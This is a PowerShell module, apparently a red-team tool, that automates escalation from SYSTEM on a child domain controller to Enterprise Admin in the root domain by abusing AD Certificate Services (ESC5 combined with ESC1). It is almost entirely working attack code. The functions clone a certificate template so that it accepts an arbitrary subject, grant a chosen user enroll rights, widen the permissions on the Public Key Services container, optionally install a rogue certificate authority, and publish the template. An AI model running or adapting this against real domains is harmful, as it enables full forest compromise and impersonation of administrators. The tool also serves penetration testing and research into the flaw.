<#

Domain Administrator to Enterprise Administrator
Child to Parent
Pew Pew
Author: Toby Jackson (heartburn)
License: BSD 3-Clause
Required Dependencies: None

Synopsis:
With SYSTEM access to a child domain controller, it is possible to add certificate templates that get propagated up the chain
and emulated into the template store on the root domain. This is an abuse of ESC5 (See: ADCS Whitepaper by Spectre Ops), which
we can combine with adding a certificate template vulnerable to ESC1. This was demonstrated in the "From DA to EA" blog post 
by @wald0, viewable in the "Recommend Reading" section below.

As a result of publishing a malicious template on the child domain, it becomes available in the root domain's certificate 
store and we can modify the permissions on the template to allow a user of our choice the ability to enrol in it.
This, plus the addition of the ENROLLEE_SUPPLIES_SUBJECT flag in the msPKI-Certificates-Name-Flag field, enables the user
to obtain a ticket with an arbitrary UPN, such as an Enterprise Administrator.

As a follow-up, Vadims Podāns of PKI Solutions discovered a way to abuse this primitive on a child domain when ADCS
is not even installed on the root domain! As SYSTEM on the child, you can install the service and set up the necessary
templates too - which of course - gets propagated up to the root domain again. 

I highly recommend reading the original research in the links below, they are eloquently written and very well explained.
This PowerShell script allows both primitives to be abused, such that it can be run from SYSTEM shells on child domains
whether the ADCS service is running or not.

One key note is that if you are installing ADCS, the exploit can still work, but the requested certificate cannot be 
immediately used. Whilst the certificate container gets replicated almost immediately up to the parent (root) domain,
the DC itself (I believe) does not auto-enrol for a short period of time. In this period, the certificate is likely to
return a "KDC_ERROR_CLIENT_NOT_TRUSTED" when using it to authenticate. Sit tight - it should become valid sooner or later.

Recommended reading and source code usage from:
https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c
https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/

Example Usage:
Import-Module .\PKIEscalate

# Perform escalation, optionally installing ADCS
Invoke-Escalation -Username GANON -TemplateName SneakyTemplate [-InstallAdcs] [-CAName]

# Remove the template that was added for exploitation
Clear-Template -TemplateName SneakyTemplate -CAName HYRULE-CA
#>


function Invoke-SystemCheck {
<#
.SYNOPSIS

Checks the current user running the script is NT AUTHORITY\SYSTEM

.DESCRIPTION

The exploit requires the SYSTEM user in order to modify the CA and templates.

#>
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
    if ($currentPrincipal.Identity.Name -ne "NT AUTHORITY\SYSTEM") {
        echo "[!] You are not SYSTEM. Exiting..."
    }
    else {
        echo "[*] We are NT AUTHORITY\SYSTEM! Continuing..."     
    }
}


function Install-ADCS {
<#
.SYNOPSIS

Installs the Active Directory Certificate Service on the child domain.


.DESCRIPTION

Uses the administrative ability on the child domain, in a child -> parent structure (multi-tiered or single-tier) to
install ADCS and set up a malicious certificate authority. This gets propagated up to the root domain. Only used if
ADCS is not already present in the environment.


.PARAMETER CAName

The name of the CA you wish to install.


.RETURNS 

[String] Name of the Certificate Authority

#>
    Param (
       [Parameter(Position = 0, Mandatory=$true)]
       [String]
       $CAName
    )

    # Install ADCS
    Install-WindowsFeature AD-Certificate, ADCS-Cert-Authority -IncludeManagementTools

    # Add CA
    Install-AdcsCertificationAuthority -CAType EnterpriseRootCA -CACommonName $CAName -Force

    return $CAName
}

function Modify-Template {
<#
.SYNOPSIS

Modifies a given template to add the ESC1 vulnerability.


.DESCRIPTION

Ensures that the ENROLLEE_SUPPLIES_SUBJECT flag is set to true.


.RETURNS 

Nothing - Maybe this is a TODO? 

#>
    Param (
       [Parameter(Position = 0, Mandatory=$true)]
       [String]
       $ExistingTemplate,

       [Parameter(Position = 1, Mandatory=$true)]
       [String]
       $NewTemplateName,

       [Parameter(Position = 2, Mandatory=$true)]
       [String]
       $RootDomain,
       
       [Parameter(Position = 3, Mandatory=$true)]
       [String]
       $Tld
    )

    echo "[*] Making copy of template: $ExistingTemplate..."
    # Create a file name to store the copied user template in 
    $TemplateCopy = ((1..20 | %{ '{0:X}' -f (Get-Random -Max 16) }) -Join '') + ".ldf"
    echo "[*] Storing template copy in: $TemplateCopy"
    # Modified template with ESC1 added
    $OutTemplate = ((1..20 | %{ '{0:X}' -f (Get-Random -Max 16) }) -Join '') + ".ldf"
    echo "[*] Storing modified template in: $OutTemplate"

    # Copy current given template
    ldifde -m -v -d "CN=$ExistingTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=$rootDomain,DC=$tld" -f $TemplateCopy


    # Add Enrolee supplies subject and modify certificate template - Doing this off a current template in the environment 
    # is safer than trying to write a pre-loaded template each time. I think anyway?
    # This also removes and necessity to use external modules to modify templates.
    # Fields to replace: 
    # dn: - We can just replace CN=TemplateName
    # cn: 
    # displayName:
    # distinguishedName: We can just replace CN=TemplateName
    # flags: 
    # msPKI-Certificate-Name-Flag:
    # msPKI-Enrollment-Flag:
    # name: 
    # pKIExtendedKeyUsage:
    # Maybe this could be handled with macro expansions in ldifde?
    
    # Replace the cn: entry
    $cnLine = Get-Content $TemplateCopy | Select-String "cn: "| Select-Object -ExpandProperty Line
    $newCnLine = "cn: $TemplateName"

    # Replace the displayNamer entry
    $displayNameLine = Get-Content $TemplateCopy | Select-String "displayName: "| Select-Object -ExpandProperty Line
    $newDisplayNameLine = "displayName: $TemplateName"

    # Modify the flags 
    $flagsLine = Get-Content $TemplateCopy | Select-String "flags: "| Select-Object -ExpandProperty Line
    $newFlagsLine = "flags: 131642"

    # Add the ESC1 value to allow specification of SAN
    $mspkiCertNameLine = Get-Content $TemplateCopy | Select-String "msPKI-Certificate-Name-Flag: "| Select-Object -ExpandProperty Line
    $newCertNameLine = "msPKI-Certificate-Name-Flag: 1"

    # Make sure manager approval is not set
    $mspkiEnrollmentLine = Get-Content $TemplateCopy | Select-String "msPKI-Enrollment-Flag: "| Select-Object -ExpandProperty Line
    $newEnrollmentLine = "msPKI-Enrollment-Flag: 9"

    # Modify the name: line
    $nameLine = Get-Content $TemplateCopy | Select-String -Pattern "^name: "| Select-Object -ExpandProperty Line
    $newNameLine = "name: $TemplateName"
                                                
    # Ensure it can be used for client authentication
    $pKIExtendedKeyUsageLine = Get-Content $TemplateCopy | Select-String "pKIExtendedKeyUsage"| Select-Object -ExpandProperty Line | select -Index 0
    $clientAuthExtendedKey = "pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2"

    (Get-Content $TemplateCopy | ? {$_ -ne ""}) | ForEach-Object {
        $_.replace("CN=$ExistingTemplate", "CN=$NewTemplateName").replace($cnLine, $newCnLine).replace($flagsLine, $newFlagsLine).replace($displayNameLine, $newDisplayNameLine).replace($mspkiCertNameLine, $newCertNameLine).replace($mspkiEnrollmentLine, $newEnrollmentLine).replace($nameLine, $newNameLine).replace($pKIExtendedKeyUsageLine, $clientAuthExtendedKey)#.replace("cn: $ExistingTemplate", "cn: $NewTemplateName")
    } | Set-Content $OutTemplate

    Add-Content -Path $OutTemplate "msPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2"
    Get-Content $OutTemplate | Select-Object -Unique | Set-Content $OutTemplate

    # Import certificate template
    ldifde -i -k -f $OutTemplate

    del $TemplateCopy
    del $OutTemplate
}

function Add-Dacl {
<#
.SYNOPSIS

Adds the "enroll" privileges to the provided template


.DESCRIPTION

This function adds the "enroll" privileges to the ESC1-vulnerable template.


.RETURNS 

# TODO: Add sanity check return

#>
    Param (
       [Parameter(Position = 0, Mandatory=$true)]
       [String]
       $TemplateName,

       [Parameter(Position = 1, Mandatory=$true)]
       [String]
       $ChildDomain,

       [Parameter(Position = 2, Mandatory=$true)]
       [String]
       $Username
    )

    # https://www.sysadmins.lv/blog-en/get-certificate-template-effective-permissions-with-powershell.aspx
    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $ConfigContext = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
    $filter = "(cn=$TemplateName)"
    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
    $Template = $ds.Findone().GetDirectoryEntry()
    # Create user object
    $objUser = New-Object System.Security.Principal.NTAccount("$ChildDomain\$Username")
    # Set Enroll GUID
    $objectGuid = New-Object Guid 0e10c968-78fb-11d2-90d4-00c04f79dc55
    # Set ExtendedRight attribute
    $ADRight = [System.DirectoryServices.ActiveDirectoryRights]"ExtendedRight"
    # Set Allow value of ACE
    $ACEType = [System.Security.AccessControl.AccessControlType]"Allow"
    # Add ACE
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $objUser, $ADRight, $ACEType, $objectGuid
    $Template.get_Options().SecurityMasks = [System.DirectoryServices.SecurityMasks]'Dacl'
    $Template.ObjectSecurity.AddAccessRule($ACE)
    $Template.commitchanges()
}

function Enable-Template {
<#
.SYNOPSIS

Enables the given template name


.DESCRIPTION

With the template imported into the template store, the correct DACL added, and the ESC1 vulnerability applied,
it just now needs to be "enabled". This can be done by modifying the CN=EnrollmentServices,CN=<CAName> object's properties
and adding the new template name to the "certificateTemplates" value


.PARAMETER TemplateName

The template name that should be enabled.


.PARAMETER CAName

The CA Name (Used for filtering AD objects).


.RETURNS 
# TODO: Add this logic
[Bool] $true / $false after checking enabled templates

#>
    Param (
       [Parameter(Position = 0, Mandatory=$true)]
       [String]
       $TemplateName,

       [Parameter(Position = 1, Mandatory=$true)]
       [String]
       $CAName
    )

    # Enable the template
    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $ConfigContext = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigContext"
    $filter = "(cn=$CAName)"
    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
    $CAObject = $ds.Findone().GetDirectoryEntry()
    # Update the value to contain the certificate template
    $CAObject.Properties['certificateTemplates'].Value += "$TemplateName"
    $CAObject.commitchanges()

    # Get the list of certificate templates after enabling it
    $TemplateList = $CAObject.Properties['certificateTemplates'].Value
    # Set a flag for a boolean positive return value
    $published = 0
    # Loop over the templates and check the template name now exists in the string value of the AD object
    foreach ($Template in $TemplateList) { 
        if ($Template -eq $TemplateName) {
            echo "[*] $TemplateName was successfully published!"
            $published = 1
            break
        }
    }
    if ($published -ne 1) {
        echo "[!] There was an issue enabling the template! Exiting..."
        sleep 5 
        exit
    }
}


function Clear-Template {
<#
.SYNOPSIS

Deletes a specified template from the certificate store.


.DESCRIPTION

Removes (ideally) the added certificate template. Pass the same name as passed when originally performing the exploit.
Caution: With SYSTEM privileges you can delete any other existing templates. Take care when passing the template
name to this function.


.PARAMETER TemplateName

The template name that should be deleted from the certificate store. The template itself does not get removed! 
Just actively removed from the live template available.


.PARAMETER CAName

The name of the Certificate Authority (Used for filtering)


.RETURNS 

[Bool] $true / $false

#>
    Param (
        [Parameter(Position = 0, Mandatory=$true)]
        [String]
        $TemplateName,

        [Parameter(Position = 1, Mandatory=$true)]
        [String]
        $CAName
    )

    $Tld =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-1]
    $RootDomain =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-2]

    # Remove the template from the store
    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $ConfigContext = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigContext"
    $filter = "(cn=$CAName)"
    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
    $CAObject = $ds.Findone().GetDirectoryEntry()
    # Since arrays cannot have their length modified straight in PowerShell, I'll create a fresh
    # array list, remove the template, then convert back to a System.Object.Array and completely
    # repopulate the variable with the updated list
    [System.Collections.ArrayList]$NewTemplateList = $CAObject.Properties['certificateTemplates'].Value
    $NewTemplateList.Remove("$TemplateName")
    $ArrayTemplateList = $NewTemplateList.ToArray()
    $CAObject.Properties['certificateTemplates'].Value = $ArrayTemplateList
    $CAObject.commitchanges()

    $DeleteTemplate = ((1..20 | %{ '{0:X}' -f (Get-Random -Max 16) }) -Join '') + ".ldf"
    Add-Content -Path $DeleteTemplate -Value "dn: CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=$RootDomain,DC=$Tld"
    Add-Content -Path $DeleteTemplate -Value "changetype: delete"

    # Delete the template from the CA itself via the CA's certificateTempates.Value property
    ldifde -i -v -f $DeleteTemplate
    del $DeleteTemplate

}

function Modify-PublicKeyServicesContainer {
<#
.SYNOPSIS

Modifies the permissions on the CN=Public Key Services container to allow inheritance for the SYSTEM user in the child domain.


.DESCRIPTION

The Public Key Services container (CN=Public Key Services) grants the SYSTEM user in the child domain full access, but access to the 
underlying Enrollment Services container (CN=Enrollment Services), which specifically contains the pKIEnrollmentService
class, does not. However, since inheritence is allowed on the object, if we can modify the "This object only" to 
"This object and its descendants" then we'll have full control, and therefore be able to modify the container/enable templates!

.RETURNS 

TODO: Add checks

#>

    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $ConfigContext = "CN=Services,$ConfigContext"
    $filter = "(cn=Public Key Services)"
    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
    $PKSObject = $ds.Findone().GetDirectoryEntry()
    # Create user object
    $objUser = New-Object System.Security.Principal.NTAccount("NT AUTHORITY\SYSTEM")
    $AdRights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"
    # Add the All inheritance to the container, granting control over the Enrollment Services container that is a child of Public Key Services
    $Scope = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"
    # Set Allow value of ACE
    $ACEType = [System.Security.AccessControl.AccessControlType]"Allow"
    # Add ACE
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $objUser, $AdRights, $ACEType, $Scope
    $PKSObject.get_Options().SecurityMasks = [System.DirectoryServices.SecurityMasks]'Dacl'
    $PKSObject.ObjectSecurity.AddAccessRule($ACE)
    $PKSObject.commitchanges()
}

function Invoke-Escalation {
<#
.SYNOPSIS

Encompassing function to perform the exploit. This is the main function that you call to escalate to EA.


.DESCRIPTION

The function works in multiple stages:
- Identify if the SYSTEM user is running the script
- Install ADCS and add a Certificate Authority (CA) // Get current ADCS details and CA name
- Lists available templates and copies one into a temporary .ldf file
- Modifies the copied template to be vulnerable to ESC1
- Imports the modified template to the certificate store - This gets propogated into the root certificate store
- Adds a DACL to the target user to allow them to enroll in the new template
- Modify the Public Key Services container to allow full control to SYSTEM plus its descendant objects
- Set the template to enabled to allow it to be requested by the specified user


.PARAMETER Username

The username that you wish to grant ESC1 abuse for. No need to pass the domain.


.PARAMETER TemplateName

The name of the template that will be added for ESC1 abuse.


.PARAMETER InstallAdcs

If ADCS is not installed in the target environment, this will install it on the writeable domain controller 
that you have SYSTEM on.


.PARAMETER CAName

If a new ADCS service is being installed, a CA name must be specified. If left blank, this
will be set to a random hexadecimal string.


.EXAMPLE

Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate [-InstallAdcs] [-CAName]


.RETURNS

[String] Certipy commands to check result of ESC1 addition for specific user

#>
    Param (
       [Parameter(Position = 0, Mandatory=$true)]
       [String]
       $Username,

       [Parameter(Position = 1, Mandatory=$true)]
       [String]
       $TemplateName,

       [Switch]
       $InstallAdcs = $false,

       [String]
       $CAName = $false
    )
    
    # Check whether we are running as SYSTEM
    Invoke-SystemCheck

    # Environment initialization
    # TODO: There should be a better way of doing this - I don't like relying on environment variables not being messed with.
    $Tld =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-1]
    $RootDomain =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-2]
    $ChildDomain = $env:USERDomain
    echo "[*] We are in running the exploit on user $ChildDomain\$Username which will propagate up to the $RootDomain.$Tld root domain!"

    if ($InstallAdcs) {
        echo "[*] Installing ADCS and creating CA $CAName..."
        Install-ADCS $CAName
    }
    else {
        # TODO: Ascertain the main CA in use before running this
        # TODO: This MAY fail if there is more than one CA! Needs testing.
        # Get the current CA name
        $ConfigCtx = ([ADSI]"LDAP://RootDSE").configurationNamingContext
        $ConfigCtx = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigCtx"
        $wildcard = "(cn=*)"
        $dsSearch = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigCtx",$wildcard)
        $CaNameContainer = $dsSearch.Findone().GetDirectoryEntry()
        $CAName = $CaNameContainer.Children.Name
    }
    
    # Get a list of existing templates to find one to make a clone of
    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $ConfigContext = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigContext"
    $filter = "(cn=$CAName)"
    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
    $PKSObject = $ds.Findone().GetDirectoryEntry()
    $TemplateList = $PKSObject.certificateTemplates
    # Check that there are templates found to make a copy from
    # TODO: Try to create a static template so we can continue in environments that have ADCS but no templates published?
    if ($TemplateList.count -lt 1) {
        echo "[!] No templates have been found to copy! Maybe there is none in use in the environment. Exiting..."
        sleep 5
        exit
    }
    # Loop over and regex out the template names
    foreach ($Template in $TemplateList) {
        if ($Template -eq "User") {  
            # I prefer using the user template as testing was done heavily with that, but now I'm re-writing the template line by line
            # rather than just modifying specific values, this shouldn't matter too much. Leaving in for redundancy 
            Modify-Template -ExistingTemplate "User" -NewTemplateName $TemplateName -Root $RootDomain -Tld $Tld
            break
        }
        # If we are at the last item in the list and haven't found User, we will use that template as a base to copy
        elseif ($Template -eq $TemplateList[-1]) {
            # If this is returning null, there's either no templates enabled, or my logic has broken somewhere...
            echo "[*] Modifying template name: $Template"
            Modify-Template -ExistingTemplate $Template -NewTemplateName $TemplateName -Root $RootDomain -Tld $Tld
            break
        }
    }        
    
    # Now we have modified the content of the template to make it vulnerable to ESC1, we need to add our target users' enrollment rights
    # Modify the template DACL to allow the low-privileged user "Enroll" rights for the template
    Add-Dacl -TemplateName $TemplateName -ChildDomain $ChildDomain -Username $Username

    # Before we enable the template, we need to provide the SYSTEM user with control over the CN=Public Key Services container
    # Otherwise, we cannot remotely enable a template, as the current permissions do not allow anything other than Enterprise Admin level
    # access to "publish" templates
    Modify-PublicKeyServicesContainer -TemplateName $TemplateName

    if (Enable-Template -TemplateName $TemplateName -CAName $CAName) {
        echo "[*] All done! User should now be able to exploit ESC1."
        echo "[*] Certipy command to check: certipy find -vulnerable -scheme ldap -u $Username -p <password> -dc-ip <DC-IP>"
        # Caveat - Needs more testing
        echo "[*] Clean up the added template with: Clear-Template -TemplateName $TemplateName -CAName $CAName"
    }
    else {
        echo "[!] Something went wrong when enabling the template!"
        exit
    }
}
